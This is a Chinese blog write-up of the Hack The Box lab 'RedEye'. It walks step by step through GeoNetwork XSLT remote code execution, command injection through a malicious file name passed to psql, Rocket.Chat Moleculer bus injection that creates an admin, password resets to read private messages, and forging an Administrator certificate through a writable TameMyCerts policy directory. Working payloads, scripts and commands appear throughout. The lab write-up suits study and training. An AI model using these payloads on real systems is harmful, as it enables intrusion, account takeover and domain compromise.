---
title: "HTB RedEye：GeoNetwork RCE、Rocket.Chat 总线提权与 ADCS 证书伪装域管"
date: 2026-11-17
categories: ["网络攻防"]
tags: ["HTB", "靶场", "Active Directory", "ADCS", "Rocket.Chat", "GeoNetwork", "Kerberos", "RDP"]
description: "HTB RedEye（Hard）实战：GeoNetwork 未授权 XSLT RCE 进内网，Rocket.Chat 总线注入拿到管理员读私信，最后借 TameMyCerts 策略用 isabel 的证书伪装成 Administrator 拿下 DC01"
draft: false
password: true
---

RedEye 是 Season 12 的 Hard 机器，前面的入口是一台 Linux 上的 GeoNetwork 4.4.11 + Rocket.Chat 8.8，真正的目标在后面：一台 Windows Server 2022 域控（ADCS + ADFS）和一台加域工作站。整条链最反直觉的一段是 Rocket.Chat——它的写入接口被过期许可证锁成了只读，但内部 Moleculer 总线没有鉴权，从总线注入设置缓存可以直接造出一个 admin。

| 项目 | 内容 |
| --- | --- |
| 目标 | 10.129.2.171（RedEye） |
| 系统 | Windows AD / Hard，前置 GN01（Ubuntu） |
| 入口 | GeoNetwork `/srv/api/formatters` 未授权上传 |
| 关键点 | XSLT Java 扩展、psql `\!` 注入、Moleculer 总线、TameMyCerts 策略目录 |

## 0. 侦察：三台主机，一个前置

外部只有一个 IP，DNAT 按 vhost 分流。内部结构：

| 主机 | 地址 | 角色 |
| --- | --- | --- |
| GN01 | 192.168.100.2 | Ubuntu，GeoNetwork 4.4.11 + Rocket.Chat 8.8.0 |
| DC01 | 192.168.100.1 | Windows Server 2022，DC + ADCS + ADFS |
| WKSTN01 | 192.168.100.3 | 加域工作站 |

```bash
nmap -Pn -p22,80,443,3000 --open 10.129.2.171
# 22 ssh / 80 geo.airways.htb / 443 sts.airways.htb(ADFS) / 3000 chat.airways.htb
echo '10.129.2.171 geo.airways.htb chat.airways.htb sts.airways.htb' >> /etc/hosts
```

DC01 上开放 53/88/135/139/389/443/445/464/636/3268/3269/3389/5985/9389，但从外部只能经 GN01 旁边的 ADFS 443 摸到。

## 1. GeoNetwork：未授权 formatter 上传 → XSLT RCE

`/geonetwork/srv/api/formatters` 只需要匿名 XSRF token，就能上传一个 XSLT formatter，并由 Saxon 带着 Java 扩展执行。

```bash
# 拿匿名 XSRF token
curl -s -c jar -H 'Host: geo.airways.htb' https://10.129.2.171/geonetwork/srv/eng/catalog.search
curl -s -b jar -c jar -H 'Host: geo.airways.htb' -H 'Accept: application/json' \
  https://10.129.2.171/geonetwork/srv/api/site
T=$(awk -F'\t' '/XSRF-TOKEN/{print $7}' jar | tail -1)

# 上传 formatter：rt:exec 是 java.lang.Runtime
curl -s -b jar -H 'Host: geo.airways.htb' -H "X-XSRF-TOKEN: $T" \
  -F 'file=@pwn.xsl;filename=pwn.xsl' https://10.129.2.171/geonetwork/srv/api/formatters

# 触发渲染
curl -s -b jar -H 'Host: geo.airways.htb' \
  https://10.129.2.171/geonetwork/srv/api/records/a1b2c3d4-5678-9abc-def0-111111111111/formatters/pwn
```

payload 长这样，注意 `$p1` 一定要被引用：

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="java:java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:variable name="p1" select="rt:exec($rt, &quot;/bin/bash -c id&gt;/tmp/gn_out&quot;)"/>
    <html><body><pre><xsl:value-of select="$p1"/></pre></body></html>
  </xsl:template>
</xsl:stylesheet>
```

```
uid=999(geonetwork) gid=989(geonetwork) groups=989(geonetwork)
GN01
```

![GeoNetwork formatter RCE：以 geonetwork(uid 999) 执行，以及同一通道读到的 notify.env](../../redeye/01-rce.png)

> **坑 1 · Saxon 会把没被引用的变量优化掉。** 一开始 `$p1` 定义了却没有 `<xsl:value-of>`，所有 exec 都“成功但没执行”；把变量输出到页面里才真正跑起来。
> **坑 2 · `Runtime.exec` 的字符串会按空格切参数。** 直接写 `"/bin/bash -c id > /tmp/x"` 会被切成 `bash -c id`；要么命令里不放空格（`id>/tmp/x`），要么用 `${IFS}`。

## 2. geonetwork → gisops：入库服务的文件名注入

GN01 上有 GeoNetwork 的入库流水线：systemd path 监控 `/srv/gis/spool/incoming`，出现 `.tif` 就以 `gisops` 身份执行：

```bash
layer=$(basename "${src%.*}")
raster2pgsql -s 4326 -d -I -C -F -t 256x256 "$src" "gis.${layer}" | psql -q -d geonetwork_db -U gis_etl
```

文件名会被当成表名拼进 SQL，而 `psql` 会解释 `\!` 元命令——于是文件名就是命令。

几个必须注意的点：

- `\!` 后面必须跟 **Tab/空格**，否则 psql 报 `invalid command \!touch`；
- `raster2pgsql` 会把标识符**全部小写**，所以不能用 `${IFS}`（变成 `${ifs}`），要用字面 Tab 分隔；
- 文件名里不能有 `/`，路径用 `$(printf<TAB>"\057")` 拼；
- 元命令要单独成行，所以文件名里塞**换行**；
- `aodb-ingest.service` 有 `PrivateTmp=yes`，输出写 `/tmp` 拿不到，写到 `/srv/gis/spool/incoming/` 再读。

```python
# 关键片段：构造恶意文件名
sl = '$(printf\t"\\057")'
cmd = 'cat<' + sl + 'etc' + sl + 'airport-gis' + sl + 'notify.env>' + spool + 'nn;#'
name = 'z"' + "\n" + '\\!' + "\t" + cmd + "\n" + '--'
```

```
# aodb-notify - Rocket.Chat publication notice credentials
RC_URL=https://chat.airways.htb
RC_USER=gabby.t
RC_PASS=behKRZ***
```

`gabby.t` 的聊天密码就是她的域密码。NTLM 走不通（SMB 返回 `STATUS_LOGON_FAILURE`，LDAP 强制签名），但 Kerberos 可以：SYSVOL、LDAP、SMB 全部打通。

## 3. Rocket.Chat：许可证锁死写接口，但总线没有门

用 ADFS 的 IdP-initiated 流程可以以 gabby 身份登进 Rocket.Chat：ADFS forms 登录 → 提交依赖方（RP）→ 拿到 `SAMLResponse` → 回灌 `/_saml/validate/adfs` → 拿 `saml_idp_credentialToken` → `/api/v1/login {"serviceName":"saml","saml":true,"credentialToken":...}`。

读是通的，但**所有创建消息的接口都是 `restricted-workspace`**——`settings.public` 里写得明明白白：

```
Cloud_Workspace_AirGapped_Restrictions_Remaining_Days = 0
```

`AirGappedRestriction.restricted` 为真时 `sendMessage` 直接抛错，`chat.update`、`rooms.mediaConfirm`、`rooms.createDiscussion` 一样。伪造 SAML 也不行：RC 强制验签，改一个字节就跳回首页。

真正的入口是 Moleculer。RC 单实例模式下 `api.broadcast` 走 `LocalBroker`，再经 federation 服务转发到传输层：

```javascript
broker.onBroadcast((eventName, args) => {
  StreamerCentral.emit('broadcast', 'local', 'broadcast', [{ eventName, args }]);
});
```

所以线上报文是 `{streamName:'local', eventName:'broadcast', args:[{eventName,args}]}`。用 moleculer 官方库接到传输层（端口每次启动随机，找 uid 996 的监听即可）：

```bash
grep -E '^ *[0-9]+:' /proc/net/tcp6   # 找 uid 3E4(996) 的 LISTEN
```

```javascript
const broker = new ServiceBroker({
  nodeID: 'pwn' + Math.random(),
  transporter: { type: 'TCP', options: { udpDiscovery: false,
    urls: ['127.0.0.1:' + PORT + '/rcnode'], useHostname: false, port: 41999 } },
});
await broker.start();
await new Promise(r => setTimeout(r, 2500)); // 等 RC 节点被发现
broker.broadcast('broadcast', {
  streamName: 'local', eventName: 'broadcast',
  args: [{ eventName: 'watch.settings', args: [{ clientAction: 'updated', setting }] }],
});
```

三条设置下去，注册接口就“合法”了：

```json
{"_id":"Accounts_RegistrationForm","value":"Public"}
{"_id":"Accounts_ManuallyApproveNewUsers","value":false}
{"_id":"Accounts_Registration_Users_Default_Roles","value":"admin"}
```

```bash
curl -sk -H 'Host: chat.airways.htb' -H 'Content-Type: application/json' \
  -d '{"username":"vanta","email":"vanta@x.com","pass":"Str0ngPassw0rd!2026AbCd","name":"vanta"}' \
  https://chat.airways.htb:3000/api/v1/users.register
# {"success":true,...,"roles":["admin"]}
```

## 4. 从 RC admin 到 isabel 的临时密码

有了 admin，`users.update` 可以直接重置 `owen.f` 的 RC 密码，然后以他的身份读私信：

```bash
curl -sk -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $UID" -H 'Content-Type: application/json' \
  -d '{"userId":"<owen>","data":{"password":"OwenRC!2026AbCdXyz9"}}' \
  https://chat.airways.htb:3000/api/v1/users.update
```

owen 和 isabel 的私信里躺着重置记录：

```
owen.f: Done. Unlocked your account and reset the password to ChangeTempP4ss***!
        - log in with that and change it straight away.
isabel.o: You're a lifesaver ... In now, changing it.
```

![总线注入后注册的账号直接拿到 admin 角色，再用它在 owen 私信里读到 isabel 的临时密码](../../redeye/02-rocketchat-dm.png)

用这个密码做 Kerberos 认证：

```
KDC_ERR_KEY_EXPIRED (Password has expired; change password to reset)
```

密码是对的，只是“下次登录必须改”。impacket 的 kpasswd 可以直接改：

```bash
python3 changepasswd.py -protocol kpasswd -dc-ip 192.168.100.1 \
  -newpass 'Qz7#vLm2***' \
  'AIRWAYS.HTB/isabel.o:ChangeTempP4ss***!@dc01.airways.htb'
```

> **坑 3 · 新密码不能包含用户名。** 第一版用了 `IsabelNew!...`，被策略打回；换掉用户名后成功。

拿到 isabel 的 TGT 后，她是 WKSTN01 的本地管理员（`BUILTIN\Administrators` 里直接有她），SMB `C$` 直接读：

```bash
smbclient.py -k -no-pass AIRWAYS.HTB/isabel.o@wkstn01.airways.htb
# C$ > cd \Users\Administrator\Desktop
# C$ > get user.txt
```

> user flag 在**本机 Administrator 的桌面**，不在 isabel 自己的目录里。

## 5. RDP 到 DC01，写入 TameMyCerts 策略

isabel 还同时在 `GP Management` 和 `Remote Desktop Users` 里，可以 RDP 上域控。因为 DC01 在内网，这里用一条反向隧道把 RDP 接出来：GN01 主动连回本机，本地监听 3390 转发到 `192.168.100.1:3389`，再用 `mstsc` 登录。

登录后是 Windows Server 的 `sconfig`，选 `15) Exit to command line` 拿到命令行，下载策略文件：

```cmd
curl http://192.168.100.2:8899/User.xml -o C:\PolicyFiles\User.xml
```

`C:\PolicyFiles` 是 CA 上 TameMyCerts 的策略目录：对 `BUILTIN\Users` 给了 `(CI)(AD)(CI)(WD)`，也就是**可以创建新文件**（已有的 `GroupPolicy_Audit.xml` 不可改）。按模板名读文件，每次请求都重载，不需要重启服务。

```xml
<CertificateRequestPolicy>
  <OutboundSubjectAlternativeName>
    <OutboundSubjectRule><Field>userPrincipalName</Field><Value></Value><Mandatory>false</Mandatory><Force>true</Force></OutboundSubjectRule>
    <OutboundSubjectRule><Field>rfc822Name</Field><Value></Value><Mandatory>false</Mandatory><Force>true</Force></OutboundSubjectRule>
    <OutboundSubjectRule><Field>userPrincipalName</Field><Value>Administrator@airways.htb</Value><Mandatory>true</Mandatory><Force>true</Force></OutboundSubjectRule>
  </OutboundSubjectAlternativeName>
  <CustomCertificateExtensions>
    <CustomCertificateExtension>
      <Oid>1.3.6.1.4.1.311.25.2</Oid>
      <Value>MD2gOwYKKwYBBAGCNxkCAaAtBCtTLTEtNS0yMS04Mjk4MDg5MzYtMjczOTU4NDMwMi02NzAxNDIxODItNTAw</Value>
    </CustomCertificateExtension>
  </CustomCertificateExtensions>
</CertificateRequestPolicy>
```

> **坑 4 · 必须先把原有的 SAN 清空。** 只加 Administrator 的 UPN 不够，KDC 会拿 isabel 自己的 UPN 去校验，返回 `KDC_ERR_CLIENT_NAME_MISMATCH`；前两条 `Value=""` + `Force=true` 把 isabel 的 UPN/rfc822Name 抹掉才行。

以 isabel 身份申请 `User` 模板（DCOM/TCP 135，Kerberos）：

```bash
certipy req -u isabel.o@airways.htb -k -no-pass \
  -ca AIRWAYS-DC01-CA -template User -dc-ip 192.168.100.1 \
  -target dc01.airways.htb -target-ip 192.168.100.1 -dcom -out adm -pfx-password pass
```

```
[*] Got certificate with UPN 'Administrator@airways.htb'
[*] Certificate object SID is 'S-1-5-21-...-500'
```

![以 isabel.o 申请 User 模板，CA 按策略文件签出了一张写着 Administrator 与 SID -500 的证书](../../redeye/03-cert.png)

证书是 isabel 申请的，但身份是 Administrator。

## 6. PKINIT → 域管 hash → root.txt

```bash
certipy auth -pfx adm.pfx -password pass -username Administrator -domain airways.htb -dc-ip 192.168.100.1
# Got TGT / Got hash for 'administrator@airways.htb': aad3b...:c15cb8...
```

![PKINIT：KDC 采信证书里的 SID，换回 Administrator 的 TGT 与 NT hash](../../redeye/04-pkinit.png)

用 TGT 直接读域控桌面：

```python
c = SMBConnection('dc01.airways.htb', '192.168.100.1')
c.kerberosLogin('Administrator', '', 'AIRWAYS.HTB', useCache=True, kdcHost='192.168.100.1')
b = io.BytesIO(); c.getFile('C$', '\\Users\\Administrator\\Desktop\\root.txt', b.write)
```

```
### root.txt
3483...
```

![用 ccache 经 SMB 读 DC01 的 C$\Users\Administrator\Desktop\root.txt（flag 已打码）](../../redeye/05-root.png)

## 复盘：这条链真正难的地方

| 环节 | 坑 | 结论 |
| --- | --- | --- |
| GeoNetwork | Saxon 优化掉未引用的变量 | exec 的变量一定要输出到页面 |
| GeoNetwork | Runtime.exec 按空格切参 | 命令里不放空格或用 `${IFS}` |
| ingest | `\!` 需要 Tab、标识符被小写、不能有 `/` | 用字面 Tab + `$(printf "\057")` 拼路径 |
| ingest | 服务有 PrivateTmp | 输出写到 spool 目录 |
| Rocket.Chat | API 写被许可证锁死 | 走 Moleculer 总线注入 `watch.settings` |
| Rocket.Chat | 传输层端口每次随机 | 从 `/proc/net/tcp6` 按 uid 找 |
| kpasswd | 过期密码改密被策略拒绝 | 新密码不能含用户名 |
| TameMyCerts | 残留 SAN 让 KDC 校验失败 | 先 `Value=""` 清空再注入 |

最值得记住的一点：**ADCS 的策略目录如果对普通用户可创建文件，等于把 CA 的签发策略交给了攻击者**。证书上写谁不算数，KDC 信的是证书里的 SID —— 而 SID 是策略模块从我们写的文件里读出来的。
